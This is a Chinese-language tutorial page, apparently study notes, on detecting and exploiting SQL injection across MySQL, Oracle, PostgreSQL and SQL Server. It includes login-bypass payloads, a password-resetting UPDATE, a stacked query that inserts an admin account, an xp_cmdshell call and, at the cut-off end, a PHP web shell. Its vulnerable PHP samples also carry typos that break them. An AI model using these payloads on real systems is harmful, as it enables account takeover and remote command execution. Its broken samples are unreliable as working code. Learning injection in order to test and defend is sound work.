<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_array<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>showproduct<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个报错是<code>mysql_fetch_array()</code>产生的</p>
<p>mysql一般用<code>mysql_error()</code>来展示错误</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php
//连接数据库 
mysql_connect("[database]", "[user]", "[password]") or
//检查错误，处理无法访问数据库的情况
die("Could not connect: ".mysql_error());
//选择数据库
mysql_select_db("[database_name]");
//从GET请求中获取category值
$category = $_GET["category"];
//创建并执行一条SQL语句
$result = mysql_query("SELECT * from products where category='$category'")；
if (!$result) { //如果有任何错误
//检査错误并显示错误信息
die("&lt;p&gt;Error: '.mysql_error().'&lt;/p&gt;');
} else {
//遍历査询结果
while ($row = mysql_fetch_array($result.MYSQL_NUM))	{
printf ("ID: %s Name: %s", $row[0], $row[1]);
}
//释放结果集
mysql_free_result($result);
?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>传入单引号做参数，报错，这是mysql_error()产生的</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>传入一个不是字符串的（不在单引号内）作参数，便会被解析成列名，报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: Unknown <span class="token keyword">column</span> <span class="token string">'attacker'</span> <span class="token operator">in</span> <span class="token string">'where clause'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>和mssql有异曲同工之妙</p>
<h6 id="Oracle错误"><a href="#Oracle错误" class="headerlink" title="Oracle错误"></a>Oracle错误</h6><p>常见错误</p>
<p>执行了语法上不正确的SQL语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">180</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">208</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Oracle数据库检测到SQL语句中有一个使用单引号引起来的字符串未被正确结束，Oracle要求字符串必须使用单引号结束。注入一个单引号时会发现产生了下列错误：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: SQLExceptionjava<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>.NET环境下的注入单引号情况：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Exception Details: System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: One <span class="token operator">or</span> more <span class="token keyword">errors</span> occurred during processing <span class="token keyword">of</span> command<span class="token punctuation">.</span>
ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>下面的例子展示了从.NET应用返回的一个错误，该程序执行的语句中包含未使用单引号 引起来的字符串：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span>
System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>HttpUnhandledException: Exception <span class="token keyword">of</span> <span class="token keyword">type</span>
<span class="token string">'System.Web.HttpUnhandledException'</span> was thrown<span class="token punctuation">.</span><span class="token comment">--&gt;</span>
System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>PHP的ociparse()函数用于准备要执行的Oracle语句。下面是该函数调用失败时PHP引擎 产生的一个错误示例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociparse <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">.</span>ociparse<span class="token punctuation">]</span> : ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>ocitest<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果ociparse()函数调用失败且未对该错误进行处理，那么应用会因为第一次失败而显示一 些其他错误，如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociexecute<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid OCI8<span class="token operator">-</span>Statement resource <span class="token operator">in</span> c:\www\victim<span class="token punctuation">.</span>com\oracle\<span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>分析报错代码</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00907</span>: missing <span class="token keyword">right</span> parenthesis atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">134</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">289</span><span class="token punctuation">)</span> at
oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>Oall7<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>Oall7<span class="token punctuation">.</span>java:<span class="token number">582</span><span class="token punctuation">)</span> at
oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTC7Protocol<span class="token punctuation">.</span>doOall7<span class="token punctuation">(</span>TTC7Protocol<span class="token punctuation">.</span>java:<span class="token number">1986</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>数据库报告SQL语句中存在”missing right parenthesis”(缺少右括号)错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套SQL语句中拥有某种控制权。例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> fieldl<span class="token punctuation">,</span> field2<span class="token punctuation">,</span>    <span class="token comment">/* 选择第一和第二个字段 */</span>
<span class="token punctuation">(</span><span class="token keyword">SELECT</span> fieldl        <span class="token comment">/* 开始子查询 */</span>
<span class="token keyword">FROM</span> table2
<span class="token keyword">WHERE</span> something <span class="token operator">=</span> <span class="token punctuation">[</span>attacker controlled variable<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">/* 结束子查询 */</span>
<span class="token keyword">as</span> field3                        <span class="token comment">/*从子査询返回*/</span>
<span class="token keyword">FROM</span> tablel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上述例子展示了一个嵌套查询。主SELECT语句执行括号中的另一条SELECT语句。如果攻击者向第二条查询语句注入某些内容并将后面的SQL语句注释掉，那么Oracle将返回”missing right parenthesis” 错误。</p>
<h6 id="PostgreSQL错误"><a href="#PostgreSQL错误" class="headerlink" title="PostgreSQL错误"></a>PostgreSQL错误</h6><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//连接并选择数据库</span>
<span class="token variable">$dbconn</span> <span class="token operator">=</span> <span class="token function">pg_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"host=localhost dbname=books user=tom password=myPassword"</span><span class="token punctuation">)</span>
<span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect:	'</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">//执行SQL查询</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM \"public\".\"Authors\" WHERE name='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$dbconnz</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Query failed: '</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将查询结果以THTML形式输出</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;table&gt;\n"</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">pg_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">PGSQL_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;tr&gt;\n"</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token keyword">as</span> <span class="token variable">$col_value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t\t&lt;td&gt;<span class="token interpolation"><span class="token variable">$col_value</span></span>&lt;/td&gt;\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;/tr&gt;\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/table&gt;\n"</span><span class="token punctuation">;</span>
<span class="token comment">//释放结果集</span>
<span class="token function">pg_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//关闭连接</span>
<span class="token function">pg_close</span><span class="token punctuation">(</span><span class="token variable">$dbconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>pg_query</code>使用传入的数据库执行sql查询语句</p>
<p><code>pg_last_error</code>获取数据库连接的最新出错信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/list_author.php?name='</span>
Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"''"</span>

<span class="token keyword">SQL</span>代码由于其他原因执行失败时<span class="token punctuation">,</span>PostgreSQL数据库将返回一个常规错误：
Query failed: ERROR: syntax error at <span class="token operator">or</span> near <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>PostgreSQL开发，利用PostgreSQL JDBC Driver</p>
<p>PostgreSQL JDBC Driver处理缺少结束引号的字符串时，会有下面的报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PSQLException: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"'\' "</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>receiveErrorResponse<span class="token punctuation">(</span>Query ExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1512</span><span class="token punctuation">)</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span>processResults<span class="token punctuation">(</span>Query
ExecutorImpl<span class="token punctuation">.</span>java:<span class="token number">1297</span><span class="token punctuation">)</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token punctuation">.</span>QueryExecutorlmpl<span class="token punctuation">.</span><span class="token keyword">execute</span><span class="token punctuation">(</span>QueryExecutorlmpl<span class="token punctuation">.</span> java:<span class="token number">188</span><span class="token punctuation">)</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>
<span class="token keyword">execute</span><span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">430</span><span class="token punctuation">)</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeWithFlags <span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">332</span><span class="token punctuation">)</span>
at org・postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2Statement<span class="token punctuation">.</span>executeQuery
<span class="token punctuation">(</span>AbstractJdbc2Statement<span class="token punctuation">.</span>java:<span class="token number">231</span><span class="token punctuation">)</span>
at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>jdbc2<span class="token punctuation">.</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>getTables <span class="token punctuation">(</span>AbstractJdbc2DatabaseMetaData<span class="token punctuation">.</span>java:<span class="token number">2190</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="应用程序的响应"><a href="#应用程序的响应" class="headerlink" title="应用程序的响应"></a>应用程序的响应</h5><h6 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h6><p>当注入一个页面一直返回相同的报错页面，这时候不能直接判断为SQL注入</p>
<p>注入代码</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span>
<span class="token keyword">FROM</span> products
<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>返回一个报错页面，接着判断是否是sql注入产生的报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span>
<span class="token keyword">FROM</span> products
<span class="token keyword">WHERE</span> category<span class="token operator">=</span><span class="token string">'attacker'</span> <span class="token operator">or</span> <span class="token string">'1'</span><span class="token operator">=</span>'<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>or '1'='1'</code>是一个条件永真式，并且是有意义的，不影响其他部分，可以返回表中的所有行，但是数据库大的时候，返回所有行会很久，这是可以注入</p>
<p><code>or '1'='2'</code>只要不影响sql语句就行</p>
<p>如果不返回报错页面了，那么应该就是sql注入引起的报错了</p>
<p>也可以用永假式<code>and '1'='1'</code>，如果不返回信息，则是sql注入，和永真相反</p>
<p>当然，永假式也可能返回信息，可能是<code>union</code>联合查询</p>
<h6 id="HTTP代码错误"><a href="#HTTP代码错误" class="headerlink" title="HTTP代码错误"></a>HTTP代码错误</h6><p>web服务器请求web源时发生错误，会返回500状态码</p>
<p>还一种是产生错误后302重定向到其他页面</p>
<h6 id="不同大小的响应"><a href="#不同大小的响应" class="headerlink" title="不同大小的响应"></a>不同大小的响应</h6><p>每次返回的响应都有所不同，比较这些细微的不同，可能找到一些注入线索</p>
<p>比如返回的内容，状态码……</p>
<h5 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h5><p>一个页面会因为不同的操作产生不同的状态，用不同的状态来表示注入的结果，自动化注入不同的内容，并根据响应状态判断注入结果，这就是SQL盲注，当然，要先找到注入点</p>
<p>例子</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=1</span>
<span class="token comment">--返回第一件商品</span>
http:<span class="token comment">//www.victim.com/showproduct.php?id=2 or 1=2</span>
―返回第二件商品<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>id=2时是正常查询， 加上<code>or 1=1</code>后会查询所有列，数据库检测该语句为异常，会返回id=1的页面，而<code>or 1=2</code>相当id=2 不影响sql语句，会进入id=2的页面</p>
<p>这样就可以通过返回页面判断注入是否成功 <code>or +payload</code></p>
<h3 id="确认SQL注入"><a href="#确认SQL注入" class="headerlink" title="确认SQL注入"></a>确认SQL注入</h3><h4 id="区别数字和字符串"><a href="#区别数字和字符串" class="headerlink" title="区别数字和字符串"></a>区别数字和字符串</h4><p>数字不需要使用单引号来表示</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">3</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> <span class="token keyword">value</span> <span class="token operator">&gt;</span> <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>其他类型使用单引号来表示</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> name <span class="token operator">=</span> <span class="token string">'Bike'</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> published_date<span class="token operator">&gt;</span><span class="token string">'01/01/2013'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="内联SQL注入"><a href="#内联SQL注入" class="headerlink" title="内联SQL注入"></a>内联SQL注入</h4><p>内联注入是指向查询注入一些SQL代码后，原来的代码仍然会全部执行</p>
<h5 id="字符串内联注入"><a href="#字符串内联注入" class="headerlink" title="字符串内联注入"></a>字符串内联注入</h5><p>实例——用户提交用户和口令发送到数据库查询对用户进行验证</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/890687249876e3832a2b2b96b5398fe6.png"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句
<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>单引号报错和前面一样</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''''</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里可以直接<code>' or 1=1 #</code>绕过验证登录，但是要不改变sql语句的结构，就不能注释后面的语句</p>
<p>这时<code>'or '1'='1</code>不会得到想要结果，因为and、or的优先级，and优先</p>
<p><code>username='' or '1'='1 and password=''</code>按照</p>
<p><code>username='' or ('1'='1' and password='')</code>执行</p>
<p>所以改变payload<code>' or 1=1 or '1'='1</code> </p>
<p>当只允许返回一行时，指定返回admin <code>'admin' and 1=1 or '1'='1</code></p>
<p>在passwd字段注入，<code>'or '1'='1</code>返回所有行</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/6fd62d2c5717e94dd7bcba0e4342e9d9.png"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users
<span class="token keyword">SET</span> password <span class="token operator">=</span> <span class="token string">'new_password'</span>
<span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'Bob'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'old_password'</span> <span class="token operator">OR</span> <span class="token string">'1'</span><span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>' OR '1'= '1</code>是注入代码</p>
<p>功能是将所有用户密码更新</p>
<h5 id="数字值内联注入"><a href="#数字值内联注入" class="headerlink" title="数字值内联注入"></a>数字值内联注入</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span>
<span class="token keyword">FROM</span> messages
<span class="token keyword">WHERE</span> uid<span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">USER</span> ENTRY<span class="token punctuation">]</span>
<span class="token keyword">ORDER</span> <span class="token keyword">BY</span> received<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>少了引号的闭合，更简单了，直接构造永真返回全部<code>num or 1=1</code></p>
<p><img src="https://images.dadream.eu.org/images/2024/07/8fd1fb2d04843d8266fc16528242a2fe.png"></p>
<p><img src="https://images.dadream.eu.org/images/2024/07/51d72d1c3f1546657dce86675b9594ed.png"></p>
<h4 id="终止式SQL注入"><a href="#终止式SQL注入" class="headerlink" title="终止式SQL注入"></a>终止式SQL注入</h4><p>攻击者在SQL注入代码时，通过注释掉剩余部分查询语句，从而结束原来的查询语句</p>
<h5 id="数据库注释语法"><a href="#数据库注释语法" class="headerlink" title="数据库注释语法"></a>数据库注释语法</h5><p><img src="https://images.dadream.eu.org/images/2024/07/81720d0d80330ebb159aadb6ca6c3bd2.png"></p>
<p><code>/* */</code>可以用来绕过过滤空格</p>
<p><code>1 or 1=1 </code>过滤空格变成<code>1or1=1</code></p>
<p><code>/* */</code>绕过 <code>1/**/or/**/1=1</code></p>
<p>还能用来检测SQL注入对注释的处理<code>id=1/*test*/</code>，没有影响话可能存在注入</p>
<h5 id="使用注释"><a href="#使用注释" class="headerlink" title="使用注释"></a>使用注释</h5><p>使用前面相同的用户登录验证</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句
<span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'$uname'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$passwd'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>' or 1=1 -- </code> or  <code>' or 1=1 #</code>返回所有行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">-- ' and password='$passwd' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>admin';#</code>  冒充admin登录</p>
<p><code>username=admin';/*'</code> <code>passwd=*/'</code>这种用于存在多个攻击参数</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">' AND passwd = '</span><span class="token operator">/</span><span class="token operator">*</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注释后剩一对单引号，连接形成空字符串，对查询无影响</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/d88c49974a29200155cf33378156e89b.png"></p>
<p>可以用来判断数据库类型</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/a87270ed8be250f52c67e92a08d774e1.png"></p>
<h5 id="执行多条语句"><a href="#执行多条语句" class="headerlink" title="执行多条语句"></a>执行多条语句</h5><p>还有另一个名字，堆叠注入，终止了一条语句，可以创建一条全新的没有限制的语句，简单说就是将原始语句结束，在后面加几条新语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a <span class="token keyword">from</span> q<span class="token punctuation">;</span><span class="token keyword">select</span> b <span class="token keyword">from</span> w<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>mssql 6.0后允许在同一连接句柄上执行包含多条语句的字符串，Mysql 4.1后也引入该功能，默认不开启，Oracle不支持，除非使用PL/SQL</p>
<p>运用前面having 1=1和group up 技术</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">……id<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">-- +</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还有其他可利用技术</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> administrators <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
<span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token string">'mysecretpassword'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?uid<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">;</span><span class="token keyword">exec</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_cmdshell <span class="token string">'ping www.google.com'</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span>
